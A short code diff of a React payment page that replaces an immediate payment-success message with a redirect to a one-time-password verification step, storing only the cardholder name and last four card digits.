@@ -26,16 +26,13 @@ export default function Payment() {
     const appId = localStorage.getItem("card_app_id");
     if (appId) {
       await base44.entities.CardApplication.update(appId, {
-        current_step: "completed",
-        status: "completed",
+        current_step: "otp",
         card_holder: form.card_holder,
         card_number_last4: form.card_number.replace(/\s/g, "").slice(-4),
       });
-      localStorage.removeItem("card_app_id");
     }
     setLoading(false);
-    alert("تم الدفع بنجاح! شكراً لك.");
-    navigate("/");
+    navigate("/otp-verify");
   };
 
   return (
